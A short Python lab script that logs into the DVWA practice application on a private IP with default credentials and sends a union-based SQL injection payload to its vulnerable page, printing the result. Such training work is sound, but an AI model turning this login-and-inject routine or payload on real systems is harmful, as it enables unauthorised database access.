"""
This script automates an SQL Injection attack against the DVWA vulnerable web application using the requests library. It logs in and sends a SQL injection payload to the vulnerable page to test for database compromise.
For security testing and simulation purposes only.
"""
import requests

target_ip = "192.168.56.101"
login_url = f"http://{target_ip}/dvwa/login.php"
sqli_url = f"http://{target_ip}/dvwa/vulnerabilities/sqli/"

login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login"
}
sqli_data = {
    "id": "1'union select 1,2-- -",
    "Submit": "Submit"
}

session = requests.Session()

print("[*] Logging in to DVWA...")
login_response = session.post(login_url, data=login_data)
if "Login failed" in login_response.text:
    print("[!] Login failed. Check credentials.")
    exit()
print("[+] Login successful.")

print("[*] Sending SQL injection payload...")
sqli_response = session.post(sqli_url, data=sqli_data)
if sqli_response.status_code == 200:
    print("[+] Injection request sent successfully.")
    print(sqli_response.text)
else:
    print(f"[!] Injection request failed. Status code: {sqli_response.status_code}")
